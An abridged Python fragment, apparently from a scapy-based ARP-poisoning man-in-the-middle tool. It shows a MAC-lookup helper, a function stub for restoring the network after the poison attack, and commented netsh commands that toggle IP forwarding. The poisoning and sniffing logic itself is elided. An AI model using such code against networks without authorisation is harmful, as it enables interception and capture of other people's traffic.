...
import sys
import threading
from scapy.all import ARP, sr, send, sniff, wrpcap
...
def get_mac(ip_address):
    ...
    resp, _ = sr(ARP(op = 1, hwdst = "ff:ff:ff:ff:ff:ff", pdst = ip_address), retry = 2, timeout = 10)
    for _, r in resp:
        return r[ARP].hwsrc
    return None

# Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with correct MAC and IP Address information
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    ...
    # os.system('netsh interface ipv4 set interface 9 forwarding = disabled')
...
# os.system('netsh interface ipv4 set interface 9 forwarding = enabled')
